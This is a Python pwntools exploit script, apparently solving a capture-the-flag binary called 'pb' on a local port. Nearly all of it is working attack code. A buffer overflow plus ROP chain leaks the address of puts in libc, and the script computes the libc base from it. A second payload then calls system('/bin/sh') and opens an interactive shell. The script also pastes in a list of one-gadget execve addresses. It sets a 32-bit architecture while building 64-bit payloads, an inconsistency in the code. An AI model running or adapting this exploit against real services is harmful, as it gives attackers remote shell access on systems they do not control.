#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 8080
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = context.binary = ELF('./pb')
libc = ELF(exe.runpath + b'/libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 8080)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)
io.sendafter(b'>>', b'2')
g = cyclic_gen(n=8)
'''
0x50a37 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
  rbp == NULL || (u16)[rbp] == NULL

0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xebcf5 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL

0xebcf8 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
'''
#cmd_ptr = next(exe.search(b"/bin/sh"))
#print(f"cmd_ptr @ 0x{cmd_ptr:02x}")

rop = ROP(exe)

main_plt = exe.symbols['main']
puts_plt = exe.symbols['puts']

puts_got = exe.got['puts']

pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
gadget_ret = (rop.find_gadget(['ret']))[0]


log.info(f"main plt @ 0x{main_plt:02x}")
log.info(f"puts plt @ 0x{puts_plt:02x}")
log.info(f"puts got @ 0x{puts_got:02x}")
log.info(f"pop_rdi  @ 0x{pop_rdi:02x}")
log.info(f"ret      @ 0x{gadget_ret:02x}")


offset = 56
overflow = b'A' * offset

# Leak libc address - printing the put global-offset
io.sendafter(b':', overflow + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_plt) + b'\n')
io.readline()
io.readline()
io.readline()
puts_leak = io.readline().strip().ljust(8,b"\x00")
puts_leak = u64(puts_leak)
log.info(f"puts_leak: 0x{puts_leak:02x}")

libc.address = puts_leak - libc.symbols['puts']
log.info(f"libc @ 0x{libc.address:02x}")


binsh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']
exit_address = libc.symbols['exit']

io.sendafter(b'>>', b'2')
pause()
io.sendafter(b':', overflow + p64(gadget_ret) + p64(pop_rdi) + p64(binsh) + p64(system) + b'\n')

io.interactive()
